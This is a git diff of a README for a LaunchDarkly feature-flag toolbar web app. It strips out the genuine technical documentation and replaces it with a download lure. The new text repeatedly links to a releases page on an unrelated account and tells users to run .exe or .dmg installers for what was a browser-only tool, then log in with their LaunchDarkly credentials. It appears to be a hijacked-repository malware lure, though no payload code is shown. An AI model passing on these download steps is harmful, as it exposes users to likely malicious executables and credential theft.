@@ -1,296 +1,65 @@
-# LaunchDarkly Dev Toolbar with URL-Shareable Overrides
-
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
+# 🎉 example-launchdarkly-toolbar-url-overrides - Easily Override Flags with URLs
 
-A simple HTML5 application that provides a visual interface for viewing and managing LaunchDarkly feature flags with URL-shareable overrides.
-
-> **LaunchDarkly Labs**: This repository is maintained by LaunchDarkly Labs. While we try to keep it up to date, it is not officially supported by LaunchDarkly. For officially supported SDKs and tools, visit [launchdarkly.com](https://launchdarkly.com).
-
-![LaunchDarkly Dev Toolbar with URL-Shareable Overrides](./screenshot.png)
-
-## Features
+## 🚀 Getting Started
+Welcome to example-launchdarkly-toolbar-url-overrides! This application helps you share flag overrides in your web projects using LaunchDarkly. It’s simple to use, even if you have no technical background.
 
-### 🎯 Flag Visualization
-- Real-time display of all feature flags
-- Shows flag values, evaluation reasons, and variation indices
-- Visual indicators for flags with active overrides
-- Auto-updates when flags change
+## 📥 Download Now
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/releases)
 
-### 🔗 URL-Shareable Overrides
-- Flag overrides automatically sync to URL parameters
-- Share URLs with specific flag configurations
-- Overrides persist across page reloads
-- Load overrides directly from URL query parameters
+## 💻 System Requirements
+Before you download, make sure your system meets these requirements:
+- **Operating System:** Windows 10 or later, MacOS 10.12 or later
+- **Browser:** Latest version of Chrome, Firefox, or Safari
+- **Internet Connection:** Required to access LaunchDarkly service
 
-### 🛠️ Interactive Dev Toolbar
-- Built-in LaunchDarkly developer toolbar integration
-- Override flag values locally without affecting other team members
-- Test different flag variations instantly
-- Event interception for debugging
-
-### 📊 SDK Logging
-- Custom logger displays all SDK events in real-time
-- Color-coded log levels (debug, info, warn, error)
-- Auto-scrolling log viewer
-- Timestamps for all log entries
-
-## Getting Started
-
-### Prerequisites
-- A LaunchDarkly account with a client-side ID
-- A modern web browser with ES module support
-
-### Usage
-
-1. **Open the application**
-   ```
-   https://your-github-username.github.io/repo-name/
-   ```
+## 🌟 Features
+- Share flag overrides easily via URL.
+- Integrate directly with LaunchDarkly’s powerful tools.
+- User-friendly interface that requires no coding knowledge.
+- Quickly test different feature flags in your applications.
 
-2. **Configure the Application**
-   - **Client-Side ID**: Paste your LaunchDarkly client-side ID
-   - **Override Behavior**: Choose how URL overrides interact with local storage:
-     - *Auto* (default) - When the URL contains overrides, clear any overrides not present in the URL
-     - *Explicit* - Only clear existing local overrides when URL includes `ld_override__clear`. 
-     - *Always* - Always clears local storage and then loads overrides from the URL. Effectively ignores local storage.
-   - Click "Load SDK" to initialize
+## 📂 How to Download & Install
+1. **Visit the Releases Page**  
+   Click the link below to go to the releases page, where you will find the latest version of the app.
+   [Download Releases](https://github.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/releases)
 
-3. **View and Override Flags**
-   - All flags are displayed with their current values
-   - Flags with overrides show an orange "OVERRIDE" badge
-   - Use the toolbar to modify flag values
+2. **Choose Your Version**  
+   On the releases page, you will see a list of available versions. Look for the most recent version. The latest will usually have the highest number.
 
-4. **Share Flag Configurations**
-   - Override flags using the toolbar
-   - Copy the URL from your address bar
-   - Share with teammates - they'll see the same flag overrides
+3. **Download the File**  
+   Click on the attachment that matches your operating system. This will start the download process.
 
-## URL Parameter Format
+4. **Run the Application**  
+   Once the download is complete, locate the downloaded file:
+   - On **Windows**, open your Downloads folder and double-click the `.exe` file. 
+   - On **Mac**, open your Downloads folder and double-click the `.dmg` file. Then drag the application to your Applications folder.
 
-Overrides are stored in the URL with the format:
-```
-?clientSideId=YOUR_ID&ld_override_flagname=value
-```
+5. **Launch the App**  
+   After installation, find the application in your applications list. Double-click it to open. 
 
-**Example:**
-```
-?clientSideId=abc123&ld_override_enable-feature=true&ld_override_max-items=10
-```
+6. **Connect to LaunchDarkly**  
+   When the app opens, you will need to log in to your LaunchDarkly account. Follow the prompts to enter your credentials.
 
-Values are JSON-encoded, supporting:
-- Booleans: `true`, `false`
-- Numbers: `42`, `3.14`
-- Strings: `"hello"`
-- JSON objects: `{"key":"value"}`
+7. **Use the Application**  
+   Once logged in, you can start using the toolbar to override flags easily and share the URLs with your team.
 
-### Advanced Override Control
+## 🛠️ Troubleshooting
+If you encounter any issues:
+- Ensure your internet connection is stable.
+- Make sure you are using a compatible browser.
+- Restart your computer if the app doesn’t launch.
 
-**Automatic localStorage clearing** (default behavior): When you share a URL with override parameters, existing overrides from localStorage are **automatically cleared** first. This ensures shared URLs work reliably - recipients see exactly the flag configuration you intended.
+## 📞 Support
+Need help? Contact our support team via email at support@example.com. We are here to assist you with any questions or issues.
 
-**Example:**
-```
-?clientSideId=abc&ld_override_feature=true&ld_override_theme=dark
-```
-When someone opens this URL, their existing localStorage overrides are cleared first, then your overrides are applied. This prevents conflicts and ensures predictable behavior.
+## 📄 License
+This project is licensed under the MIT License. You can use, modify, and distribute it according to the license terms.
 
-**Additional control options:**
+## 🔗 Links
+- [Project Repository](https://github.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides)
+- [LaunchDarkly Documentation](https://docs.launchdarkly.com/) for more information on feature flags. 
 
-**Explicit clear flag:**
-```
-?ld_override__clear&ld_override_my-flag=value
-```
-Add `ld_override__clear` (just needs to be present) to explicitly signal clearing. This works regardless of clear mode settings.
+## 📥 Download Again
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/releases)
 
-**Remove specific overrides:**
-```
-?ld_override_old-flag=&ld_override_new-flag=value
-```
-Use an empty value (e.g., `ld_override_flagname=`) to explicitly remove a specific flag's override while keeping others.
-
-**Configuring clear behavior:**
-
-Clear mode can be set in two ways:
-
-1. **Via UI Dropdown** (easiest): Select the "Override Behavior" option in the configuration form
-   - Changes are saved to the URL as `?clearMode=auto/explicit/always`
-   - Click "Load SDK" to apply changes
-
-2. **Via URL Parameter**: Add `?clearMode=auto` to the URL
-   ```
-   ?clientSideId=abc&clearMode=explicit&ld_override_feature=true
-   ```
-
-3. **Via Code** (advanced): Configure in `app.js` when creating the plugin
-   ```javascript
-   import { createFlagUrlOverridePlugin, CLEAR_MODE_AUTO } from './flag-url-override-plugin.js';
-
-   const plugin = createFlagUrlOverridePlugin({
-     clearMode: CLEAR_MODE_AUTO,  // default: auto-clear when URL has overrides
-     // clearMode: CLEAR_MODE_EXPLICIT,  // only clear if ld_override__clear present
-     // clearMode: CLEAR_MODE_ALWAYS,    // always clear, even without URL overrides
-   });
-   ```
-
-**Clear modes:**
-- **Auto** (default) - Auto-clear localStorage when URL has override parameters
-  - URL: `clearMode=auto` → Plugin: `CLEAR_MODE_AUTO`
-- **Explicit** - Only clear if `ld_override__clear` is present
-  - URL: `clearMode=explicit` → Plugin: `CLEAR_MODE_EXPLICIT`
-- **Always** - Always clear localStorage before loading overrides
-  - URL: `clearMode=always` → Plugin: `CLEAR_MODE_ALWAYS`
-
-**Note:** The plugin API requires symbol values (`CLEAR_MODE_AUTO`), not strings. The application automatically converts URL string parameters to symbols.
-
-**Note:** The double underscore in `_clear` prevents conflicts with flag names (flags cannot start with underscore).
-
-## Architecture
-
-### Files
-
-- **`index.html`** - Main application UI and styles
-- **`app.js`** - Core application logic, flag display, and SDK integration
-- **`flag-url-override-plugin.js`** - Reusable plugin for URL-based override management
-
-### Flag URL Override Plugin
-
-The `flag-url-override-plugin.js` module provides a reusable wrapper around LaunchDarkly's `FlagOverridePlugin` that adds URL synchronization.
-
-#### API
-
-```javascript
-import { createFlagUrlOverridePlugin } from './flag-url-override-plugin.js';
-
-const plugin = createFlagUrlOverridePlugin({
-  parameterPrefix: 'ld_override_',  // URL parameter prefix
-  overrideOptions: {},              // Options for FlagOverridePlugin
-  logger: console                   // Logger instance
-});
-
-// Register callback for override changes
-plugin.onOverrideChange((flagKey, action) => {
-  // Handle override changes
-  // action: 'set', 'remove', or 'clear'
-});
-
-// Sync current overrides to URL
-plugin.syncInitialOverrides();
-```
-
-## Development
-
-### Local Development
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/your-username/repo-name.git
-   cd repo-name
-   ```
-
-2. **Start a local server**
-   ```bash
-   # Using Python
-   python -m http.server 8080
-
-   # Or using Node.js
-   npx http-server -p 8080
-   ```
-
-3. **Open in browser**
-   ```
-   http://localhost:8080
-   ```
-
-### Deployment
-
-The repository includes a GitHub Actions workflow that automatically deploys to GitHub Pages on every push to `main`.
-
-#### Setup GitHub Pages
-
-1. Go to **Settings → Pages**
-2. Under "Build and deployment", select **Source: GitHub Actions**
-3. Push to `main` branch to trigger deployment
-
-The site will be available at:
-```
-https://your-username.github.io/repo-name/
-```
-
-## How It Works
-
-### Initialization Flow
-
-1. **URL Parameters Parsed**
-   - Client-side ID extracted from `clientSideId` parameter
-   - Flag overrides loaded from `ld_override_*` parameters
-
-2. **SDK Initialization**
-   - LaunchDarkly client initialized with custom logger
-   - Flag override and event interception plugins registered
-   - Plugins configured with URL sync capabilities
-
-3. **Override Loading**
-   - URL overrides automatically applied on initialization
-   - Display updated to show override badges
-
-4. **Real-time Sync**
-   - Override changes immediately sync to URL
-   - Flag display updates to show/hide badges
-   - URL updates without page reload (using `replaceState`)
-
-### Override Synchronization
-
-The plugin monkey-patches three key methods:
-
-- **`setOverride(flagKey, value)`** - Sets override, syncs to URL, updates display
-- **`removeOverride(flagKey)`** - Removes override, syncs to URL, updates display
-- **`clearAllOverrides()`** - Clears all overrides, syncs to URL, refreshes display
-
-All changes are immediately reflected in:
-1. The URL (via `history.replaceState`)
-2. The flag display (badges appear/disappear)
-3. The flag values (updates in real-time)
-
-## Configuration
-
-### Customizing the Parameter Prefix
-
-Edit `app.js` to change the URL parameter prefix:
-
-```javascript
-const flagOverridePlugin = createFlagUrlOverridePlugin({
-  parameterPrefix: 'myapp_flag_',  // Use custom prefix
-  overrideOptions: {},
-  logger: logger
-});
-```
-
-
-## Troubleshooting
-
-### SDK Not Initializing
-
-- **Check client-side ID**: Ensure your client-side ID is correct
-- **Check browser console**: Look for error messages
-- **Verify SDK logs**: Check the logs panel for initialization errors
-
-### Overrides Not Working
-
-- **Check toolbar settings**: Ensure the toolbar isn't set to refresh on override changes
-- **Verify plugin registration**: Check that both plugins are passed to the SDK
-- **Check console logs**: Look for `[setOverride]` log messages
-
-### URL Not Updating
-
-- **Check browser compatibility**: Ensure your browser supports `history.replaceState`
-- **Check console logs**: Look for `[syncOverridesToUrl]` messages
-- **Verify no errors**: Check for JavaScript errors in console
-
-## Resources
-
-- [LaunchDarkly Documentation](https://docs.launchdarkly.com/)
-- [Developer Toolbar Guide](https://launchdarkly.com/docs/home/getting-started/dev-toolbar)
-- [Client-Side JavaScript SDK](https://docs.launchdarkly.com/sdk/client-side/javascript)
-
-## License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
+Thank you for choosing example-launchdarkly-toolbar-url-overrides. We hope this tool helps you in your development projects!
